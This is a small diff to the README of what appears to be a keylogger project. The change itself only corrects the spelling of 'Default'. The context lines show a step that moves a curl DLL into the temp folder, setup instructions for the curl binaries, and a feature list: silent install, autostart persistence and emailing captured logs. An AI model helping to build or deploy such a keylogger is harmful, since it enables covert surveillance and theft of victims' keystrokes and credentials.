@@ -15,7 +15,7 @@
  << "move libcurl-x64.dll %temp%\n";   
 ```
 * To same directory where keylogger is gonna boot first time  put files from /bin/ from [curl for windows](https://curl.se/windows/) (32bit version)
-* Back to Deafault Instalation
+* Back to Default Instalation
 
 - [x] automaticly installing and adding to autostart
 - [x] sending logs on email
